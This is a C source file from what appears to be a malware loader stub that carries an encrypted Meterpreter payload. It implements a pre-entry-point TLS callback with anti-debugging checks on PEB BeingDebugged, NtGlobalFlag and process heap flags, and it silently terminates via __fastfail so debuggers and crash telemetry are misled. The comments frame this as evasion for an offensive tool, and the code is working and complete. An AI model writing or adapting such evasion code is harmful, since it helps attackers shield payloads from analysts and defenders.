/*
 * TlsCallback.c  —  Anti-debug / anti-analysis TLS callbacks
 *
 * TLS (Thread Local Storage) callbacks are registered in the .tls PE section
 * and are invoked by the Windows Loader BEFORE AddressOfEntryPoint receives
 * control.  This means:
 *   - ApiHashing_InitHashes() has NOT been called yet.
 *   - The XTEA key has NOT been derived; no payload is in memory.
 *   - ntdll and kernel32 ARE mapped; the process heap IS initialised.
 *
 * As a consequence, the only safe primitives available here are:
 *   - CPU intrinsics  (__readgsqword / __readfsdword / __fastfail)
 *   - Direct PEB/heap field reads via pointer arithmetic
 *   - No CRT, no ApiHashing, no HellsHall — zero external dependencies
 *
 * =========================================================================
 * Registration (MSVC-specific)
 *
 *   The linker builds the TLS callback table from all .CRT$XL? sections.
 *   Placing a PIMAGE_TLS_CALLBACK pointer in .CRT$XLB puts it first in the
 *   table (before any CRT-owned callbacks that might live in .CRT$XLC+).
 *
 *   /INCLUDE:_tls_used  — forces emission of IMAGE_DIRECTORY_ENTRY_TLS even
 *                         when there are no __declspec(thread) variables.
 *   /INCLUDE:__xl_b     — satisfies the linker reference to our callback slot.
 *
 *   x64: decorated names are identical to C names (no leading underscore).
 *   x86: MSVC prepends '_', so __xl_b -> ___xl_b; adjust if building x86.
 * =========================================================================
 */

#include <Windows.h>
#include "Structs.h"

/* Forward declaration so the linker sees the symbol before .CRT$XLB */
void NTAPI TlsCallback_AntiDebug(PVOID DllHandle, DWORD dwReason, PVOID Reserved);

/* =========================================================================
 * CRT-free TLS infrastructure
 *
 * The MSVC CRT normally provides _tls_used (IMAGE_TLS_DIRECTORY), the .tls
 * section sentinels, and the callback-table brackets.  Since this Stub links
 * with /NODEFAULTLIB we must supply them ourselves.
 *
 * Linker collects .CRT$XL* sections in alphabetical order:
 *   .CRT$XLA  — __xl_a  (NULL start sentinel)
 *   .CRT$XLB  — __xl_b  (our callback)
 *   .CRT$XLZ  — __xl_z  (NULL end sentinel / table terminator)
 *
 * _tls_used.AddressOfCallBacks must point to &__xl_a + 1 (the first real
 * slot) so Windows sees a NULL-terminated array starting with __xl_b.
 * ========================================================================= */
#pragma section(".tls",     long, read, write)
#pragma section(".tls$ZZZ", long, read, write)
__declspec(allocate(".tls"))     char _tls_start = 0;
__declspec(allocate(".tls$ZZZ")) char _tls_end   = 0;

/* Loader writes the TLS slot index here at process attach */
static ULONG _tls_index = 0;

#pragma section(".CRT$XLA", long, read)
#pragma section(".CRT$XLZ", long, read)
__declspec(allocate(".CRT$XLA")) PIMAGE_TLS_CALLBACK __xl_a = NULL;
__declspec(allocate(".CRT$XLZ")) PIMAGE_TLS_CALLBACK __xl_z = NULL;

/* IMAGE_TLS_DIRECTORY — satisfies /INCLUDE:_tls_used without the CRT */
const IMAGE_TLS_DIRECTORY _tls_used = {
    (ULONG_PTR)&_tls_start,
    (ULONG_PTR)&_tls_end,
    (ULONG_PTR)&_tls_index,
    (ULONG_PTR)(&__xl_a + 1),  /* callbacks start after start sentinel */
    0,                          /* SizeOfZeroFill */
    0                           /* Characteristics */
};

/* ---- linker directives: force TLS directory + register our slot -------- */
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma comment(linker, "/INCLUDE:__xl_b")

#pragma data_seg(".CRT$XLB")
PIMAGE_TLS_CALLBACK __xl_b = TlsCallback_AntiDebug;
#pragma data_seg()

/* Builder searches stub.bin for the 4-byte magic below and patches byte[4] to 0
 * when --no-tls is given, disabling this callback at runtime.
 * volatile prevents the compiler from caching or removing the check. */
static volatile BYTE TLS_GUARD[5] = { 0xCA, 0xFE, 0xF0, 0x0D, 0x01 };

/* =========================================================================
 *  TlsCallback_AntiDebug
 *
 *  Runs on DLL_PROCESS_ATTACH only (i.e., once, at process startup).
 *  Thread attach/detach events are ignored — they fire for every Meterpreter
 *  channel thread and would add unnecessary overhead.
 *
 *  Checks performed:
 *
 *  [1] PEB->BeingDebugged
 *      Byte set by the kernel when any Win32 debugger (x64dbg, WinDbg,
 *      OllyDbg, Visual Studio) attaches.  IsDebuggerPresent() reads this
 *      same byte.  We read it directly to avoid importing that function
 *      and to resist API-level hooks that redirect IsDebuggerPresent.
 *
 *  [2] PEB->NtGlobalFlag & 0x70
 *      ntdll sets three heap instrumentation flags whenever a debugger is
 *      present during process creation:
 *        FLG_HEAP_ENABLE_TAIL_CHECK    0x10
 *        FLG_HEAP_ENABLE_FREE_CHECK    0x20
 *        FLG_HEAP_VALIDATE_PARAMETERS  0x40
 *      These persist for the lifetime of the process.  Offset is
 *      architecture-dependent (PEB layout differs between x86 and x64).
 *        x64: NtGlobalFlag at PEB + 0x0BC
 *        x86: NtGlobalFlag at PEB + 0x068
 *
 *  [3] ProcessHeap->Flags   != 2   (HEAP_GROWABLE only in a clean process)
 *  [4] ProcessHeap->ForceFlags != 0
 *      ntdll adds instrumentation bits to the default process heap when
 *      heap debug flags are active.  A clean process always has Flags == 2
 *      and ForceFlags == 0.
 *        x64: Flags at heap + 0x70,  ForceFlags at heap + 0x74
 *        x86: Flags at heap + 0x40,  ForceFlags at heap + 0x44
 *      In Structs.h the ProcessHeap pointer lives at PEB.Reserved4[1]
 *      (matches the public winternl.h layout).
 *
 *  On detection: __fastfail(FAST_FAIL_FATAL_APP_EXIT)
 *    - Compiler intrinsic — expands to  mov ecx, 7 / int 0x29
 *    - Bypasses all user-mode exception handlers (VEH, SEH, UnhandledFilter)
 *    - No ExitProcess / TerminateProcess call, so debugger exit-breakpoints
 *      never fire — the process just disappears from under the debugger
 *    - WER / crash telemetry records STATUS_STACK_BUFFER_OVERRUN (c0000409),
 *      indistinguishable from a legitimate memory-safety crash
 * ========================================================================= */
void NTAPI TlsCallback_AntiDebug(PVOID DllHandle, DWORD dwReason, PVOID Reserved)
{
    /* Builder sets TLS_GUARD[4] = 0 when --no-tls is given — bail out immediately */
    if (TLS_GUARD[4] == 0)
        return;

    /* Only run environment checks at process startup */
    if (dwReason != DLL_PROCESS_ATTACH)
        return;

    /* Obtain PEB pointer via segment register — no API call required.
     * GS:[0x60] on x64, FS:[0x30] on x86 always points to the current PEB. */
#if defined(_M_X64)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    /* Paranoia guard — PEB is always valid at this point, but avoid a null
     * deref that would create a more visible crash than __fastfail. */
    if (!pPeb)
        return;

    /* ------------------------------------------------------------------
     * Check 1: BeingDebugged (PEB + 0x002)
     * ------------------------------------------------------------------ */
    if (pPeb->BeingDebugged)
        __fastfail(FAST_FAIL_FATAL_APP_EXIT);

    /* ------------------------------------------------------------------
     * Check 2: NtGlobalFlag — heap instrumentation bits set by ntdll
     *          when a debugger is present at process creation time
     * ------------------------------------------------------------------ */
#if defined(_M_X64)
    ULONG ntGlobalFlag = *(PULONG)((PBYTE)pPeb + 0xBC);
#else
    ULONG ntGlobalFlag = *(PULONG)((PBYTE)pPeb + 0x68);
#endif

    if (ntGlobalFlag & 0x70)
        __fastfail(FAST_FAIL_FATAL_APP_EXIT);

    /* ------------------------------------------------------------------
     * Checks 3 & 4: Process heap flags
     *   PEB.Reserved4[1] == PEB.ProcessHeap in the public winternl.h layout
     * ------------------------------------------------------------------ */
    PVOID pHeap = pPeb->Reserved4[1];
    if (pHeap)
    {
#if defined(_M_X64)
        ULONG heapFlags      = *(PULONG)((PBYTE)pHeap + 0x70);
        ULONG heapForceFlags = *(PULONG)((PBYTE)pHeap + 0x74);
#else
        ULONG heapFlags      = *(PULONG)((PBYTE)pHeap + 0x40);
        ULONG heapForceFlags = *(PULONG)((PBYTE)pHeap + 0x44);
#endif
        /* Clean process: Flags == HEAP_GROWABLE (0x2), ForceFlags == 0.
         * Any extra bits or non-zero ForceFlags reveal a debug session. */
        if ((heapFlags & ~2UL) != 0 || heapForceFlags != 0)
            __fastfail(FAST_FAIL_FATAL_APP_EXIT);
    }
}
